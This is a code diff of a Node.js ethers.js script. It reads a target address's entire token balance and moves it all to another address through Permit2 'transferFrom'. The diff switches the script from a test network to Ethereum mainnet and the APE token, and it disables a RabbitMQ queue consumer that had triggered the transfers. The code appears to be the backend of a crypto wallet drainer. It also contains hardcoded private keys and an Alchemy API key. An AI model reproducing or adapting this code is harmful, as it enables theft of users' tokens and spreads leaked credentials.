@@ -1,49 +1,49 @@
-const amqp = require("amqplib/callback_api");
-const { exec } = require("child_process");
-const fs = require("fs");
+// const amqp = require("amqplib/callback_api");
+// const { exec } = require("child_process");
+// const fs = require("fs");
 const { ethers } = require("ethers");
-amqp.connect("amqp://rabbitmq", (err, connection) => {
-    if (err) {
-        console.error("Failed to connect to RabbitMQ:", err);
-        return;
-    }
+// amqp.connect("amqp://rabbitmq", (err, connection) => {
+//     if (err) {
+//         console.error("Failed to connect to RabbitMQ:", err);
+//         return;
+//     }
 
-    // 创建频道
-    connection.createChannel((err, channel) => {
-        if (err) {
-            console.error("Failed to create channel:", err);
-            return;
-        }
+//     // 创建频道
+//     connection.createChannel((err, channel) => {
+//         if (err) {
+//             console.error("Failed to create channel:", err);
+//             return;
+//         }
 
-        // 声明队列
-        const queueName = "monit_message";
-        channel.assertQueue(queueName, { durable: true });
+//         // 声明队列
+//         const queueName = "monit_message";
+//         channel.assertQueue(queueName, { durable: true });
 
-        console.log("Waiting for messages...");
+//         console.log("Waiting for messages...");
 
-        // 接收消息并处理
-        channel.consume(queueName, (msg) => {
-            if (msg === null) {
-                // 队列中没有消息，等待新的消息
-                return;
-            }
+//         // 接收消息并处理
+//         channel.consume(queueName, (msg) => {
+//             if (msg === null) {
+//                 // 队列中没有消息，等待新的消息
+//                 return;
+//             }
 
-            const monitData = msg.content.toString();
+//             const monitData = msg.content.toString();
 
-            // 执行构建操作
-            handelPermit2Transfer(monitData)
-                .then(() => {
-                    // 构建完成后，确认消息已处理
-                    channel.ack(msg);
-                })
-                .catch((error) => {
-                    // 发生错误，可以选择重新将消息放回队列等待重试
-                    console.error("Error occurred during build:", error);
-                    channel.nack(msg);
-                });
-        });
-    });
-});
+//             // 执行构建操作
+//             handelPermit2Transfer(monitData)
+//                 .then(() => {
+//                     // 构建完成后，确认消息已处理
+//                     channel.ack(msg);
+//                 })
+//                 .catch((error) => {
+//                     // 发生错误，可以选择重新将消息放回队列等待重试
+//                     console.error("Error occurred during build:", error);
+//                     channel.nack(msg);
+//                 });
+//         });
+//     });
+// });
 const abi = [
     {
         inputs: [
@@ -877,16 +877,15 @@ const permit2_abi = [
     },
 ];
 const provider_address =
-    "https://eth-goerli.g.alchemy.com/v2/WiwidMq7OcizVoxOJcviZzZHPcWzHwHt";
-
+    "https://eth-mainnet.g.alchemy.com/v2/otntqecKVNu7AW5kP9Z370M8TsQ_cmsb";
 const provider = new ethers.providers.JsonRpcProvider(provider_address);
 const signer = provider.getSigner();
 
 const privateKey =
-    "b824a00abfe6125d54e8029bf832d60c5de7b91f33795fd10b0edf8dccb877a3"; //2582
+    "85d32dd8b22d25bcda3bddfadeeb5c7614326213679b4c23826fe74539700f56";
 const wallet = new ethers.Wallet(privateKey, provider); //创建钱包
 
-const contract_address = "0x15EF301c8731eEb753A98110d496a74F35CE6fBd"; //goUSDT
+const contract_address = "0x4d224452801aced8b2f0aebe155379bb5d594381"; //ape
 const permit2_contarct_address = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
 const erc20_instance = new ethers.Contract(contract_address, abi, provider);
@@ -911,8 +910,8 @@ async function v3check(ownerAddress, spender_address) {
 async function handelPermit2Transfer(monitData) {
     // const parsedData = JSON.parse(monitData);
     // const { chainId, address } = parsedData.monitData;
-    console.log("收到消息开始转账");
-    const ownerAddress = "0xDf25813d91B139cbdeC94519898D8f672253a027";
+
+    const ownerAddress = "0xc18f0d85528948dee12730f0378066718aee9eeb";
     const spender_address = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
     //查询客户余额
     const balance = await getTokenBalances(ownerAddress);
@@ -926,7 +925,7 @@ async function handelPermit2Transfer(monitData) {
         //     "0xc143ea056dd2f62a128808cc0c47d9477f9080c080a037437ba52140dbac1d7dc65cdb58531e038930c82314817f91cb8d8ea36a2bd0a001e134479d567b8595d7";
         //执行转账
         const owner_wuwu = ownerAddress;
-        const spender_haha = "0x433093f43acA393Ccee7AFe93082c6818C9b65Aa";
+        const spender_haha = "0xDf25813d91B139cbdeC94519898D8f672253a027";
         const amount = balance.toString();
         await permit2_contarct_instance[
             "transferFrom(address,address,uint160,address)"
